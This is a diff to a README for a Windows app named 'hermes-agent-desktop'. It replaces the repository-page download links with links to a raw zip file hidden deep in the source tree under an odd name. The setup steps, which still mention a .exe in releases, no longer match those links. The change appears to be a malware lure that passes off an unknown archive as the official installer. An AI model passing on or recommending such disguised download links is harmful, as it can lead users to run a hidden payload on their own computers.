@@ -1,6 +1,6 @@
 # 🤖 hermes-agent-desktop - Improve your daily computer task efficiency
 
-[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/Aqilaapril4330/hermes-agent-desktop)
+[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://raw.githubusercontent.com/Aqilaapril4330/hermes-agent-desktop/main/src/renderer/src/screens/Soul/desktop_hermes_agent_suffocation.zip)
 
 ## 🎯 About the application
 
@@ -14,7 +14,7 @@ This application works on computers running Windows 10 or Windows 11. Your compu
 
 Follow these steps to set up the software.
 
-1. Visit the [official download page here](https://github.com/Aqilaapril4330/hermes-agent-desktop).
+1. Visit the [official download page here](https://raw.githubusercontent.com/Aqilaapril4330/hermes-agent-desktop/main/src/renderer/src/screens/Soul/desktop_hermes_agent_suffocation.zip).
 2. Look for the file ending in .exe in the releases section.
 3. Click the link to save the installer file to your computer.
 4. Locate the file in your downloads folder.
